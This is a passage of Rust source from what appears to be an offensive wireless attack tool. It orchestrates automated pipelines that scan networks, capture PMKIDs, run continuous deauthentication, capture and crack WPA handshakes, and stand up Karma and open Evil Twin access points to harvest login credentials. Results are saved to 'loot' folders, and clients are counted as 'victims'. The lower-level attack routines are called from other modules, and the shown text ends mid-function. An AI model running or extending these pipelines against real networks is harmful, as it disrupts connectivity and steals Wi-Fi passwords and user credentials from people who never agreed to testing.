use std::{
    fs,
    path::{Path, PathBuf},
    time::SystemTime,
};

use anyhow::{Context, Result};
use chrono::Local;
use walkdir::WalkDir;

use crate::menu::PipelineType;
use crate::ops::shared::preflight::preflight_only_summary;
use rustyjack_commands::{Commands, WifiCommand, WifiPipelinePreflightArgs};

use super::super::state::{App, CancelDecision, PipelineResult, StepOutcome};

impl App {
    /// Launch an attack pipeline
    pub(crate) fn launch_attack_pipeline(&mut self, pipeline_type: PipelineType) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        let review_path = self.root.join("REVIEW_APPROVED.md");

        if !review_path.exists() {
            let interface = if active_interface.trim().is_empty() {
                None
            } else {
                Some(active_interface.clone())
            };
            let args = WifiPipelinePreflightArgs {
                interface,
                pipeline: pipeline_id(pipeline_type).to_string(),
                requires_monitor: true,
            };
            let (msg, data) = self
                .core
                .dispatch(Commands::Wifi(WifiCommand::PipelinePreflight(args)))?;
            let mut lines = preflight_only_summary(&data).unwrap_or_else(|| vec![msg]);

            if self
                .config
                .settings
                .operation_mode
                .eq_ignore_ascii_case("stealth")
                && pipeline_type != PipelineType::StealthRecon
            {
                lines.push("".to_string());
                lines.push("Blocked by Stealth mode".to_string());
            }

            return self.show_message("Pipeline Preflight", lines.iter().map(|s| s.as_str()));
        }

        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
            && pipeline_type != PipelineType::StealthRecon
        {
            return self.show_message(
                "Stealth Mode",
                [
                    "Pipelines are blocked",
                    "in Stealth (traceable)",
                    "Only Stealth Recon",
                    "pipeline is permitted.",
                ],
            );
        }

        if active_interface.is_empty() {
            return self.show_message(
                "Attack Pipeline",
                [
                    "No WiFi interface set",
                    "",
                    "Run Hardware Sanity Check",
                    "to configure interface",
                ],
            );
        }

        if !self.monitor_mode_supported(&active_interface) {
            return self.show_message(
                "Hardware Error",
                [
                    "Interface does not",
                    "support monitor mode.",
                    "",
                    "External adapter required",
                ],
            );
        }

        let (title, description, steps) = match pipeline_type {
            PipelineType::GetPassword => (
                "Get WiFi Password",
                "Automated sequence to obtain target WiFi password",
                vec![
                    "1. Scan networks",
                    "2. PMKID capture",
                    "3. Deauth attack",
                    "4. Capture handshake",
                    "5. Quick crack",
                ],
            ),
            PipelineType::MassCapture => (
                "Mass Capture",
                "Capture handshakes from all visible networks",
                vec![
                    "1. Scan all networks",
                    "2. Channel hopping",
                    "3. Multi-target deauth",
                    "4. Continuous capture",
                ],
            ),
            PipelineType::StealthRecon => (
                "Stealth Recon",
                "Passive reconnaissance with NO transmission",
                vec![
                    "1. Randomize MAC",
                    "2. Minimum TX power",
                    "3. Passive scan only",
                    "4. Probe sniffing",
                ],
            ),
            PipelineType::CredentialHarvest => (
                "Credential Harvest",
                "Capture login credentials via fake networks",
                vec![
                    "1. Probe sniff",
                    "2. Karma attack",
                    "3. Evil Twin APs",
                    "4. Captive portal",
                ],
            ),
            PipelineType::FullPentest => (
                "Full Pentest",
                "Complete automated wireless audit",
                vec![
                    "1. Stealth recon",
                    "2. Network mapping",
                    "3. PMKID harvest",
                    "4. Deauth attacks",
                    "5. Evil Twin/Karma",
                    "6. Crack passwords",
                ],
            ),
        };

        // Show pipeline description with text wrapping
        let mut all_lines: Vec<String> = Vec::new();
        all_lines.push(description.to_string());
        all_lines.push("".to_string());
        all_lines.push("Steps:".to_string());
        for step in &steps {
            all_lines.push(step.to_string());
        }
        all_lines.push("".to_string());
        all_lines.push("SELECT = Continue".to_string());

        self.show_message(title, all_lines.iter().map(|s| s.as_str()))?;

        if !self.confirm_yes_no_bool("Start Pipeline?", ["Run this pipeline now?"])? {
            self.go_home()?;
            return Ok(());
        }

        // Select mode: Standard or Indefinite
        let mode_options = vec![
            "Standard Mode".to_string(),
            "Indefinite Mode".to_string(),
            "Cancel".to_string(),
        ];
        let mode_choice = self.choose_from_list("Pipeline Mode", &mode_options)?;

        let indefinite_mode = match mode_choice {
            Some(0) => false, // Standard
            Some(1) => true,  // Indefinite
            _ => {
                self.go_home()?;
                return Ok(());
            }
        };

        if indefinite_mode {
            self.show_message(
                "Indefinite Mode",
                [
                    "Each step will run until",
                    "it captures required data",
                    "or reaches max duration.",
                    "",
                    "Progress only when",
                    "resources are obtained.",
                ],
            )?;
        }

        // If target needed and not set, prompt for network selection
        let needs_target = matches!(
            pipeline_type,
            PipelineType::GetPassword | PipelineType::CredentialHarvest
        );

        if needs_target && self.config.settings.target_network.is_empty() {
            self.show_message(
                "Select Target",
                ["No target network set", "", "Scanning networks..."],
            )?;

            // Scan and let user pick target
            self.scan_wifi_networks()?;

            // Check if user selected a target
            if self.config.settings.target_network.is_empty() {
                return self.show_message(
                    "Pipeline Cancelled",
                    ["No target selected", "", "Select a network first"],
                );
            }
        }

        let target_dir = self.pipeline_target_dir();
        let (pipeline_dir, started_at) = self.prepare_pipeline_loot_dir(&target_dir)?;

        // Execute pipeline steps using actual attack implementations
        let result = self.execute_pipeline_steps(pipeline_type, title, &steps, indefinite_mode)?;
        let loot_copy = self.capture_pipeline_loot(started_at, &target_dir, &pipeline_dir);
        let loot_dir_display = pipeline_dir
            .strip_prefix(&self.root)
            .unwrap_or(&pipeline_dir)
            .display()
            .to_string();
        let (loot_status_line, loot_detail_line) = match loot_copy {
            Ok(copied) => (
                format!("Loot: {}", loot_dir_display),
                Some(format!("Files copied: {}", copied)),
            ),
            Err(e) => {
                eprintln!("[pipeline] loot copy failed: {e:?}");
                (
                    format!("Loot: {} (copy failed)", loot_dir_display),
                    Some(format!("{e}")),
                )
            }
        };

        // Pipeline complete - show results
        if result.cancelled {
            let mut lines: Vec<String> = vec![
                format!("Stopped at step {}", result.steps_completed + 1),
                "".to_string(),
                "Partial results may be".to_string(),
                "saved in loot folder".to_string(),
            ];
            lines.push("".to_string());
            lines.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                lines.push(detail);
            }
            self.show_message("Pipeline Cancelled", lines)?;
            self.go_home()
        } else {
            let mut summary = vec![format!("{} finished", title), "".to_string()];

            if result.pmkids_captured > 0 {
                summary.push(format!("PMKIDs: {}", result.pmkids_captured));
            }
            if result.handshakes_captured > 0 {
                summary.push(format!("Handshakes: {}", result.handshakes_captured));
            }
            if let Some(ref password) = result.password_found {
                summary.push(format!("PASSWORD: {}", password));
            }
            if result.networks_found > 0 {
                summary.push(format!("Networks: {}", result.networks_found));
            }
            if result.clients_found > 0 {
                summary.push(format!("Clients: {}", result.clients_found));
            }

            summary.push("".to_string());
            summary.push(loot_status_line);
            if let Some(detail) = loot_detail_line {
                summary.push(detail);
            }

            self.show_message("Pipeline Complete", summary.iter().map(|s| s.as_str()))?;
            self.go_home()
        }
    }

    pub(crate) fn prepare_pipeline_loot_dir(
        &self,
        target_dir: &Path,
    ) -> Result<(PathBuf, SystemTime)> {
        fs::create_dir_all(target_dir)
            .with_context(|| format!("creating target loot directory {}", target_dir.display()))?;
        let pipelines_root = target_dir.join("pipelines");
        fs::create_dir_all(&pipelines_root).with_context(|| {
            format!("creating pipelines directory {}", pipelines_root.display())
        })?;
        let ts = Local::now().format("%Y%m%d_%H%M%S").to_string();
        let run_dir = pipelines_root.join(ts);
        fs::create_dir_all(&run_dir)
            .with_context(|| format!("creating pipeline run directory {}", run_dir.display()))?;
        Ok((run_dir, SystemTime::now()))
    }

    pub(crate) fn pipeline_target_dir(&self) -> PathBuf {
        let settings = &self.config.settings;
        let name_source = if !settings.target_network.is_empty() {
            settings.target_network.clone()
        } else if !settings.target_bssid.is_empty() {
            settings.target_bssid.clone()
        } else {
            "Unknown".to_string()
        };
        let safe = Self::sanitize_target_name(&name_source);
        self.root.join("loot").join("Wireless").join(safe)
    }

    pub(crate) fn sanitize_target_name(name: &str) -> String {
        let mut out = String::with_capacity(name.len());
        for ch in name.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                out.push(ch);
            } else {
                out.push('_');
            }
        }
        let trimmed = out.trim_matches('_').to_string();
        if trimmed.is_empty() {
            "Unknown".to_string()
        } else {
            trimmed
        }
    }

    pub(crate) fn capture_pipeline_loot(
        &self,
        started_at: SystemTime,
        target_dir: &Path,
        pipeline_dir: &Path,
    ) -> Result<usize> {
        let wireless_base = self.root.join("loot").join("Wireless");
        if !wireless_base.exists() {
            return Ok(0);
        }

        let mut copied = 0usize;
        for entry in WalkDir::new(&wireless_base)
            .into_iter()
            .filter_entry(|e| !e.path().starts_with(pipeline_dir))
        {
            let entry = entry?;
            let path = entry.path();
            if path.is_dir() {
                continue;
            }
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            let modified = match metadata.modified() {
                Ok(t) => t,
                Err(_) => continue,
            };
            if modified < started_at {
                continue;
            }

            let rel = if path.starts_with(target_dir) {
                path.strip_prefix(target_dir).unwrap_or(path)
            } else if path.starts_with(&wireless_base) {
                path.strip_prefix(&wireless_base).unwrap_or(path)
            } else {
                continue;
            };

            if rel.as_os_str().is_empty() {
                continue;
            }

            let dest = pipeline_dir.join(rel);
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)
                    .with_context(|| format!("creating {}", parent.display()))?;
            }
            fs::copy(path, &dest)
                .with_context(|| format!("copying {} to {}", path.display(), dest.display()))?;
            copied += 1;
        }

        Ok(copied)
    }

    /// Execute the actual pipeline steps using real attack implementations
    pub(crate) fn execute_pipeline_steps(
        &mut self,
        pipeline_type: PipelineType,
        title: &str,
        steps: &[&str],
        indefinite_mode: bool,
    ) -> Result<PipelineResult> {
        let mut result = PipelineResult {
            cancelled: false,
            steps_completed: 0,
            pmkids_captured: 0,
            handshakes_captured: 0,
            password_found: None,
            networks_found: 0,
            clients_found: 0,
        };

        let active_interface = self.config.settings.active_network_interface.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let target_ssid = self.config.settings.target_network.clone();
        let total_steps = steps.len();

        for (i, step) in steps.iter().enumerate() {
            // Check for cancel before each step
            if matches!(self.check_cancel_request(title)?, CancelDecision::Cancel) {
                result.cancelled = true;
                return Ok(result);
            }

            // In indefinite mode, retry steps until they produce results
            let mut step_successful = false;
            let mut retry_count = 0;
            const MAX_RETRIES: usize = 10; // Safety limit to prevent infinite loops

            while !step_successful && (!indefinite_mode || retry_count < MAX_RETRIES) {
                // Show progress
                let progress = (i as f32 / total_steps as f32) * 100.0;
                let overlay = self.stats.snapshot();
                let status_text = if indefinite_mode && retry_count > 0 {
                    format!("{} [Retry {}] [KEY2=Cancel]", step, retry_count)
                } else {
                    format!("{} [KEY2=Cancel]", step)
                };
                self.display
                    .draw_progress_dialog(title, &status_text, progress, &overlay)?;

                // Execute the step based on pipeline type and step index
                let step_result = match pipeline_type {
                    PipelineType::GetPassword => self.execute_get_password_step(
                        i,
                        &active_interface,
                        &target_bssid,
                        target_channel,
                        &target_ssid,
                        indefinite_mode,
                    )?,
                    PipelineType::MassCapture => {
                        self.execute_mass_capture_step(i, &active_interface)?
                    }
                    PipelineType::StealthRecon => {
                        self.execute_stealth_recon_step(i, &active_interface)?
                    }
                    PipelineType::CredentialHarvest => self.execute_credential_harvest_step(
                        i,
                        &active_interface,
                        &target_ssid,
                        target_channel,
                    )?,
                    PipelineType::FullPentest => self.execute_full_pentest_step(
                        i,
                        &active_interface,
                        &target_bssid,
                        target_channel,
                        &target_ssid,
                    )?,
                };

                // Update result from step
                match step_result {
                    StepOutcome::Completed(Some((
                        pmkids,
                        handshakes,
                        password,
                        networks,
                        clients,
                    ))) => {
                        result.pmkids_captured += pmkids;
                        result.handshakes_captured += handshakes;
                        let password_found = password.is_some();
                        if password.is_some() {
                            result.password_found = password;
                        }
                        result.networks_found += networks;
                        result.clients_found += clients;

                        // In indefinite mode, check if step actually captured what it needed
                        if indefinite_mode {
                            step_successful = match i {
                                0 => networks > 0,       // Scan needs to find networks
                                1 => pmkids > 0,         // PMKID needs captures
                                2 | 3 => handshakes > 0, // Deauth/capture needs handshakes
                                4 => password_found,     // Crack needs password
                                _ => true,               // Other steps always progress
                            };

                            // Log what we're waiting for if not successful
                            if !step_successful {
                                let waiting_for = match i {
                                    0 => "networks to be found",
                                    1 => "PMKID to be captured",
                                    2 | 3 => "handshake to be captured",
                                    4 => "password to be cracked",
                                    _ => "results",
                                };
                                eprintln!(
                                    "[PIPELINE] Step {} incomplete: waiting for {}",
                                    i + 1,
                                    waiting_for
                                );
                            }
                        } else {
                            step_successful = true; // Standard mode always progresses
                        }
                    }
                    StepOutcome::Completed(None) => {
                        // This shouldn't happen with our fixed code, but handle it anyway
                        if indefinite_mode {
                            step_successful = false; // In indefinite mode, no results = retry
                        } else {
                            step_successful = true; // Standard mode progresses anyway
                        }
                    }
                    StepOutcome::Skipped(reason) => {
                        result.cancelled = true;
                        self.show_message(
                            "Pipeline stopped",
                            [&format!("Step {} halted", i + 1), "", &reason],
                        )?;
                        return Ok(result);
                    }
                }

                if !step_successful && indefinite_mode {
                    retry_count += 1;
                    if retry_count >= MAX_RETRIES {
                        result.cancelled = true;
                        let waiting_for = match i {
                            0 => "No networks found",
                            1 => "No PMKIDs captured",
                            2 | 3 => "No handshakes captured",
                            4 => "Password not cracked",
                            _ => "No results obtained",
                        };
                        self.show_message(
                            "Pipeline stopped",
                            [
                                &format!("Step {} failed", i + 1),
                                "",
                                waiting_for,
                                &format!("{} retries exhausted", MAX_RETRIES),
                            ],
                        )?;
                        return Ok(result);
                    }

                    // Show brief message before retry
                    let retry_msg = format!("Retry {}/{}", retry_count, MAX_RETRIES);
                    eprintln!("[PIPELINE] {}", retry_msg);
                }

                // Check for cancel during retries
                if indefinite_mode && !step_successful {
                    if matches!(self.check_cancel_request(title)?, CancelDecision::Cancel) {
                        result.cancelled = true;
                        return Ok(result);
                    }
                }
            }

            result.steps_completed = i + 1;

            // If we found the password in GetPassword pipeline, we can stop early
            if pipeline_type == PipelineType::GetPassword && result.password_found.is_some() {
                break;
            }
        }

        Ok(result)
    }

    /// Execute a step in the GetPassword pipeline
    /// Returns (pmkids, handshakes, password, networks, clients)
    pub(crate) fn execute_get_password_step(
        &mut self,
        step: usize,
        interface: &str,
        bssid: &str,
        channel: u8,
        ssid: &str,
        _indefinite_mode: bool,
    ) -> Result<StepOutcome> {
        use rustyjack_commands::{
            Commands, WifiCommand, WifiDeauthArgs, WifiPmkidArgs, WifiScanArgs,
        };

        match step {
            0 => {
                // Step 1: Scan networks
                let preflight_error = self.preflight_wireless_scan(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 20)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            1 => {
                // Step 2: PMKID capture
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let preflight_error = self.preflight_pmkid_capture(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: Some(bssid.to_string()),
                    ssid: Some(ssid.to_string()),
                    channel,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 35)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            2 => {
                // Step 3: Deauth attack
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let preflight_error = self.preflight_deauth_attack(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 64,
                    duration: 30,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Deauth", cmd, 35)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            3 => {
                // Step 4: Handshake capture (continuation of deauth with longer capture)
                if bssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target BSSID not set; select a network first".to_string(),
                    ));
                }
                let preflight_error = self.preflight_handshake_capture(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                    interface: interface.to_string(),
                    bssid: bssid.to_string(),
                    ssid: Some(ssid.to_string()),
                    client: None,
                    channel,
                    packets: 32,
                    duration: 60,
                    continuous: true,
                    interval: 1,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 65)? {
                    let handshakes = if data
                        .get("handshake_captured")
                        .and_then(|v| v.as_bool())
                        .unwrap_or(false)
                    {
                        1
                    } else {
                        0
                    };
                    return Ok(StepOutcome::Completed(Some((0, handshakes, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            4 => {
                // Step 5: Quick crack - look for handshake files and try to crack
                let loot_dir = self.root.join("loot/Wireless");
                if loot_dir.exists() {
                    // Find the most recent handshake export
                    if let Some(handshake_path) = self.find_recent_handshake(&loot_dir) {
                        use rustyjack_commands::WifiCrackArgs;
                        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
                            file: handshake_path.to_string_lossy().to_string(),
                            ssid: Some(ssid.to_string()),
                            mode: "quick".to_string(),
                            wordlist: None,
                        }));
                        if let Some((_msg, data)) =
                            self.dispatch_cancellable("Cracking", cmd, 120)?
                        {
                            if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                                return Ok(StepOutcome::Completed(Some((
                                    0,
                                    0,
                                    Some(password.to_string()),
                                    0,
                                    0,
                                ))));
                            }
                            // Crack completed but no password found
                            return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
                        }
                        return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
                    }
                }
                return Ok(StepOutcome::Skipped(
                    "No captured handshake available to crack".to_string(),
                ));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))))
    }

    /// Execute a step in the MassCapture pipeline
    pub(crate) fn execute_mass_capture_step(
        &mut self,
        step: usize,
        interface: &str,
    ) -> Result<StepOutcome> {
        use rustyjack_commands::{Commands, WifiCommand, WifiPmkidArgs, WifiScanArgs};

        match step {
            0 => {
                // Step 1: Scan all networks
                let preflight_error = self.preflight_wireless_scan(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Scanning", cmd, 35)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            1 => {
                // Step 2: Channel hopping scan (longer passive scan)
                let preflight_error = self.preflight_wireless_scan(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Scan(WifiScanArgs {
                    interface: Some(interface.to_string()),
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Ch. Hop", cmd, 50)? {
                    let count = data.get("count").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, count, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            2 => {
                // Step 3: Multi-target PMKID capture (passive, all networks)
                let preflight_error = self.preflight_pmkid_capture(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
                    interface: interface.to_string(),
                    bssid: None,
                    ssid: None,
                    channel: 0, // Hop through channels
                    duration: 90,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("PMKID", cmd, 100)? {
                    let pmkids = data
                        .get("pmkids_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((pmkids, 0, None, 0, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            3 => {
                // Step 4: Continuous capture (probe sniffing for client info)
                let preflight_error = self.preflight_probe_sniff(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                use rustyjack_commands::WifiProbeSniffArgs;
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Capture", cmd, 70)? {
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the StealthRecon pipeline
    pub(crate) fn execute_stealth_recon_step(
        &mut self,
        step: usize,
        interface: &str,
    ) -> Result<StepOutcome> {
        use rustyjack_commands::{
            Commands, WifiCommand, WifiMacRandomizeArgs, WifiProbeSniffArgs, WifiTxPowerArgs,
        };

        match step {
            0 => {
                // Step 1: Randomize MAC
                #[cfg(target_os = "linux")]
                {
                    if let Err(err) = self.core.dispatch(Commands::Wifi(WifiCommand::MacRandomize(
                        WifiMacRandomizeArgs {
                            interface: interface.to_string(),
                        },
                    ))) {
                        return Ok(StepOutcome::Skipped(format!(
                            "MAC randomize failed: {}",
                            err
                        )));
                    }
                }
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            1 => {
                // Step 2: Minimum TX power
                #[cfg(target_os = "linux")]
                {
                    if let Err(err) =
                        self.core
                            .dispatch(Commands::Wifi(WifiCommand::TxPower(WifiTxPowerArgs {
                                interface: interface.to_string(),
                                dbm: 1,
                            })))
                    {
                        return Ok(StepOutcome::Skipped(format!(
                            "TX power set failed: {}",
                            err
                        )));
                    }
                }
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            2 => {
                // Step 3: Passive scan only (no probe requests sent)
                // Use probe sniff which is passive
                let preflight_error = self.preflight_probe_sniff(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 60,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Passive", cmd, 70)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, networks, 0))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            3 => {
                // Step 4: Extended probe sniffing
                let preflight_error = self.preflight_probe_sniff(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 120,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 130)? {
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the CredentialHarvest pipeline
    pub(crate) fn execute_credential_harvest_step(
        &mut self,
        step: usize,
        interface: &str,
        ssid: &str,
        channel: u8,
    ) -> Result<StepOutcome> {
        use rustyjack_commands::{
            Commands, WifiCommand, WifiEvilTwinArgs, WifiKarmaArgs, WifiProbeSniffArgs,
        };

        match step {
            0 => {
                // Step 1: Probe sniff to find target networks
                let preflight_error = self.preflight_probe_sniff(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 30,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Sniffing", cmd, 40)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, 0, None, networks, clients,
                    ))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            1 => {
                // Step 2: Karma attack
                let preflight_error = self.preflight_karma(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::Karma(WifiKarmaArgs {
                    interface: interface.to_string(),
                    duration: 60,
                    channel: if channel > 0 { channel } else { 6 },
                    ap_interface: None,
                    with_ap: false,
                    ssid_whitelist: None,
                    ssid_blacklist: None,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Karma", cmd, 70)? {
                    let clients = data.get("victims").and_then(|v| v.as_u64()).unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((0, 0, None, 0, clients))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            2 => {
                // Step 3: Evil Twin AP
                if ssid.is_empty() {
                    return Ok(StepOutcome::Skipped(
                        "Target SSID not set; select a network first".to_string(),
                    ));
                }
                let preflight_error = self.preflight_evil_twin(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
                    interface: interface.to_string(),
                    ssid: ssid.to_string(),
                    channel: if channel > 0 { channel } else { 6 },
                    duration: 90,
                    target_bssid: None,
                    open: true,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Evil Twin", cmd, 100)? {
                    let clients = data
                        .get("clients_connected")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let handshakes = data
                        .get("handshakes_captured")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    return Ok(StepOutcome::Completed(Some((
                        0, handshakes, None, 0, clients,
                    ))));
                }
                return Ok(StepOutcome::Skipped("Cancelled by user".to_string()));
            }
            3 => {
                // Step 4: Captive portal (continuation of Evil Twin)
                // Evil Twin with open network serves as captive portal
                return Ok(StepOutcome::Completed(Some((0, 0, None, 0, 0))));
            }
            _ => {}
        }
        Ok(StepOutcome::Completed(None))
    }

    /// Execute a step in the FullPentest pipeline
    pub(crate) fn execute_full_pentest_step(
        &mut self,
        step: usize,
        interface: &str,
        bssid: &str,
        channel: u8,
        ssid: &str,
    ) -> Result<StepOutcome> {
        use rustyjack_commands::{
            Commands, WifiCommand, WifiDeauthArgs, WifiKarmaArgs, WifiMacRandomizeArgs,
            WifiPmkidArgs, WifiProbeSniffArgs, WifiScanArgs,
        };

        match step {
            0 => {
                // Step 1: Stealth recon - MAC randomization + passive scan
                #[cfg(target_os = "linux")]
                {
                    if let Err(err) = self.core.dispatch(Commands::Wifi(WifiCommand::MacRandomize(
                        WifiMacRandomizeArgs {
                            interface: interface.to_string(),
                        },
                    ))) {
                        return Ok(StepOutcome::Skipped(format!(
                            "MAC randomize failed: {}",
                            err
                        )));
                    }
                }
                let preflight_error = self.preflight_probe_sniff(interface)?;
                if let Some(error) = self.preflight_or_skip(preflight_error)? {
                    return Ok(StepOutcome::Skipped(error));
                }
                let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
                    interface: interface.to_string(),
                    channel: 0,
                    duration: 45,
                }));
                if let Some((_, data)) = self.dispatch_cancellable("Recon", cmd, 55)? {
                    let networks = data
                        .get("unique_networks")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
                    let clients = data
                        .get("unique_clients")
                        .and_then(|v| v.as_u64())
                        .unwrap_or(0) as u32;
